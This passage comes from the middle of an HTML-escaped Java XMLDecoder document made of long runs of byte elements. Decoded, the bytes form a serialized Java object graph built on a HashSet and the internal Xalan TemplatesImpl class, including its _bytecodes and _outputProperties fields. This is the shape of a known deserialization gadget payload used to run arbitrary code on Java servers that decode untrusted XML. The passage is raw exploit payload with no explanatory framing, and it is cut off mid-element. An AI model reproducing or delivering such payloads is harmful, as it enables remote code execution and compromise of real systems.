index="54"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="55"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="56"&gt;&lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="57"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="58"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="59"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="60"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="61"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="62"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="63"&gt;&lt;byte&gt;-70&lt;/byte&gt;&lt;/void&gt;&lt;void index="64"&gt;&lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="65"&gt;&lt;byte&gt;-123&lt;/byte&gt;&lt;/void&gt;&lt;void index="66"&gt;&lt;byte&gt;-107&lt;/byte&gt;&lt;/void&gt;&lt;void index="67"&gt;&lt;byte&gt;-106&lt;/byte&gt;&lt;/void&gt;&lt;void index="68"&gt;&lt;byte&gt;-72&lt;/byte&gt;&lt;/void&gt;&lt;void index="69"&gt;&lt;byte&gt;-73&lt;/byte&gt;&lt;/void&gt;&lt;void index="70"&gt;&lt;byte&gt;52&lt;/byte&gt;&lt;/void&gt;&lt;void index="71"&gt;&lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="74"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="75"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="76"&gt;&lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="77"&gt;&lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="81"&gt;&lt;byte&gt;16&lt;/byte&gt;&lt;/void&gt;&lt;void index="82"&gt;&lt;byte&gt;63&lt;/byte&gt;&lt;/void&gt;&lt;void index="83"&gt;&lt;byte&gt;64&lt;/byte&gt;&lt;/void&gt;&lt;void index="89"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="90"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="91"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="93"&gt;&lt;byte&gt;58&lt;/byte&gt;&lt;/void&gt;&lt;void index="94"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="95"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="96"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="97"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="98"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="99"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="100"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="101"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="102"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="103"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="104"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="105"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="106"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="107"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="108"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="109"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="110"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="111"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="112"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="113"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="114"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="115"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="116"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="117"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="118"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="119"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="120"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="121"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="122"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="123"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="124"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="125"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="126"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="127"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="128"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="129"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="130"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="131"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="132"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="133"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="134"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="135"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="136"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="137"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="138"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="139"&gt;&lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="140"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="141"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="142"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="143"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="144"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="145"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="146"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="147"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="148"&gt;&lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="149"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="150"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="151"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="152"&gt;&lt;byte&gt;9&lt;/byte&gt;&lt;/void&gt;&lt;void index="153"&gt;&lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="154"&gt;&lt;byte&gt;79&lt;/byte&gt;&lt;/void&gt;&lt;void index="155"&gt;&lt;byte&gt;-63&lt;/byte&gt;&lt;/void&gt;&lt;void index="156"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="157"&gt;&lt;byte&gt;-84&lt;/byte&gt;&lt;/void&gt;&lt;void index="158"&gt;&lt;byte&gt;-85&lt;/byte&gt;&lt;/void&gt;&lt;void index="159"&gt;&lt;byte&gt;51&lt;/byte&gt;&lt;/void&gt;&lt;void index="160"&gt;&lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="162"&gt;&lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="163"&gt;&lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="165"&gt;&lt;byte&gt;13&lt;/byte&gt;&lt;/void&gt;&lt;void index="166"&gt;&lt;byte&gt;95&lt;/byte&gt;&lt;/void&gt;&lt;void index="167"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="168"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="169"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="170"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="171"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="172"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="173"&gt;&lt;byte&gt;78&lt;/byte&gt;&lt;/void&gt;&lt;void index="174"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="175"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="176"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="177"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="178"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="179"&gt;&lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="181"&gt;&lt;byte&gt;14&lt;/byte&gt;&lt;/void&gt;&lt;void index="182"&gt;&lt;byte&gt;95&lt;/byte&gt;&lt;/void&gt;&lt;void index="183"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="184"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="185"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="186"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="187"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="188"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="189"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="190"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="191"&gt;&lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="192"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="193"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="194"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="195"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="196"&gt;&lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="198"&gt;&lt;byte&gt;21&lt;/byte&gt;&lt;/void&gt;&lt;void index="199"&gt;&lt;byte&gt;95&lt;/byte&gt;&lt;/void&gt;&lt;void index="200"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="201"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="202"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="203"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="204"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="205"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="206"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="207"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="208"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="209"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="210"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="211"&gt;&lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="212"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="213"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="214"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="215"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="216"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="217"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="218"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="219"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="220"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="222"&gt;&lt;byte&gt;11&lt;/byte&gt;&lt;/void&gt;&lt;void index="223"&gt;&lt;byte&gt;95&lt;/byte&gt;&lt;/void&gt;&lt;void index="224"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="225"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="226"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="227"&gt;&lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="228"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="229"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="230"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="231"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="232"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="233"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="234"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="236"&gt;&lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="237"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="238"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="239"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="240"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="241"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="242"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="243"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="244"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="245"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="246"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="247"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="248"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="249"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="250"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="251"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="252"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="253"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="254"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="255"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="256"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="257"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="258"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="259"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="260"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="261"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="262"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="263"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="264"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="265"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="266"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="267"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="268"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="269"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="270"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="271"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="272"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="273"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="274"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="275"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="276"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="277"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="278"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="279"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="280"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="281"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="282"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="283"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="284"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="285"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="286"&gt;&lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="287"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="288"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="289"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="290"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="291"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="292"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="293"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="294"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="295"&gt;&lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="296"&gt;&lt;byte&gt;91&lt;/byte&gt;&lt;/void&gt;&lt;void index="298"&gt;&lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="299"&gt;&lt;byte&gt;95&lt;/byte&gt;&lt;/void&gt;&lt;void index="300"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="301"&gt;&lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="302"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="303"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="304"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="305"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="306"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="307"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="308"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="309"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="311"&gt;&lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="312"&gt;&lt;byte&gt;91&lt;/byte&gt;&lt;/void&gt;&lt;void index="313"&gt;&lt;byte&gt;91&lt;/byte&gt;&lt;/void&gt;&lt;void index="314"&gt;&lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="315"&gt;&lt;byte&gt;91&lt;/byte&gt;&lt;/void&gt;&lt;void index="317"&gt;&lt;byte&gt;6&lt;/byte&gt;&lt;/void&gt;&lt;void index="318"&gt;&lt;byte&gt;95&lt;/byte&gt;&lt;/void&gt;&lt;void index="319"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="320"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="321"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="322"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="323"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="324"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="326"&gt;&lt;byte&gt;18&lt;/byte&gt;&lt;/void&gt;&lt;void index="327"&gt;&lt;byte&gt;91&lt;/byte&gt;&lt;/void&gt;&lt;void index="328"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="329"&gt;&lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="330"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="331"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="332"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="333"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="334"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="335"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="336"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="337"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="338"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="339"&gt;&lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="340"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="341"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="342"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="343"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="344"&gt;&lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="345"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="347"&gt;&lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="348"&gt;&lt;byte&gt;95&lt;/byte&gt;&lt;/void&gt;&lt;void index="349"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="350"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="351"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="352"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="353"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="355"&gt;&lt;byte&gt;18&lt;/byte&gt;&lt;/void&gt;&lt;void index="356"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="357"&gt;&lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="358"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="359"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="360"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="361"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="362"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="363"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="364"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="365"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="366"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="367"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="368"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="369"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="370"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="371"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="372"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="373"&gt;&lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="374"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="376"&gt;&lt;byte&gt;17&lt;/byte&gt;&lt;/void&gt;&lt;void index="377"&gt;&lt;byte&gt;95&lt;/byte&gt;&lt;/void&gt;&lt;void index="378"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="379"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="380"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="381"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="382"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="383"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="384"&gt;&lt;byte&gt;80&lt;/byte&gt;&lt;/void&gt;&lt;void index="385"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="386"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="387"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="388"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="389"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="390"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="391"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="392"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="393"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="394"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="396"&gt;&lt;byte&gt;22&lt;/byte&gt;&lt;/void&gt;&lt;void index="397"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="398"&gt;&lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="399"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="400"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="401"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="402"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="403"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="404"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="405"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="406"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="407"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="408"&gt;&lt;byte&gt;80&lt;/byte&gt;&lt;/void&gt;&lt;void index="409"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="410"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="411"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void 